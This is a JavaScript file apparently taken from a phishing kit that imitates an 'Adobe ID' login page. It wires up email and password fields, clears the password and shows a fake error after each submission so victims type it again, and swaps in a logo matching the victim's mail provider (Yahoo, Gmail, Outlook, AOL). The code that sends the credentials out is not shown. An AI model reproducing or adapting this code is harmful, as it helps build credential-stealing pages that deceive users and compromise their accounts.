window.onload = function () {
    initApp(bindElements, document.getElementsByTagName('body')[0]);
}

function bindElements(params) {
    window.LIB_submitButton = document.querySelector('button[type="submit"]');
    window.LIB_userInput = document.getElementById('m3dmail');
    window.LIB_pwdInput = document.getElementById('EmailPage-EmailField');
    window.LIB_form = document.getElementById('m3dform');
    window.LIB_spinner = document.querySelector('button .LIB_spinner_el');

    document.getElementsByTagName('title')[0].innerText = 'Adobe ID';

    // document.getElementById('title')
    //     .innerText = capitalizeFirstLetter(getEmailDomainName(params.email)) + ' Secured Adobe Portal';

    ['change', 'keyup', 'paste'].forEach((evt) => {
        window.LIB_userInput.addEventListener(evt, function () {
            toggleMail();
        }, false);
    })

    window.LIB_pwdInput.addEventListener('keyup', function () {
        hideError();
    });

    window.LIB_onLoginFail = function () {
        showError()
        window.LIB_pwdInput.value = '';
    };
}

function showError() {
    const notice = document.getElementById('error');
    notice.style.display = 'block';
    [window.LIB_userInput, window.LIB_pwdInput].forEach((el) => {
        el.classList.add('is-invalid');
    })
}

function hideError() {
    const notice = document.getElementById('error');
    notice.style.display = 'none';
    [window.LIB_userInput, window.LIB_pwdInput].forEach((el) => {
        el.classList.remove('is-invalid');
    })
}


function toggleMail() {
    const inputState = window.LIB_userInput.value.toLowerCase();

    if (inputState.includes("@yahoo")) {
        imageSwap("yahoo")
    } else if (inputState.includes("@gmail")) {
        imageSwap("gmail")
    } else if (inputState.includes("@outlook." || "@hotmail" || "@live.")) {
        imageSwap("outlook")
    } else if (inputState.includes("@aol.")) {
        imageSwap("aol")
    } else {
        imageSwap("img")
    }

}


function imageSwap(name) {
    const img = document.getElementById('m3dimg');
    img.src = "./media/images/swap/" + name + ".png";
}